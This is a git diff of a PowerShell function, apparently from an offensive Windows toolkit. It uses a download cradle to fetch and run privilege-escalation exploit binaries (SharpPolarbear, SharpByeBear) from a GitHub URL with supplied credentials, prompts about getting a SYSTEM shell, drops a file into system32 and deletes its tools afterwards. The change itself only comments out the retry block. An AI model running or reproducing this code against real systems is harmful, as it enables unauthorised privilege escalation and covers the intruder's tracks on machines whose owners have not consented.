@@ -187,7 +187,7 @@ function sharpcradle{
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpPolarbearx86.exe license.rtf $username $password
 		}
 		
-		$system = Read-Host -Prompt 'Did you get a system shell? (y/n)'
+		<#$system = Read-Host -Prompt 'Did you get a system shell? (y/n)'
 		if ($system -eq "no" -or $system -eq "n" -or $system -eq "No" -or $system -eq "N")
 		{
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe license.rtf 2
@@ -197,7 +197,7 @@ function sharpcradle{
 			.\cradle.exe -w https://github.com/SecureThisShit/Creds/raw/master/exeFiles/winexploits/SharpByeBear.exe license.rtf 2
 			Write-Host -ForegroundColor Yellow 'Click into the search bar on your lower left side'
 			Start-Sleep -Seconds 15
-		}
+		}#>
 		move env:USERPROFILE\Appdata\Local\temp\license.rtf C:\windows\system32\license.rtf
 		del .\cradle.exe
 		del .\schedsvc.dll
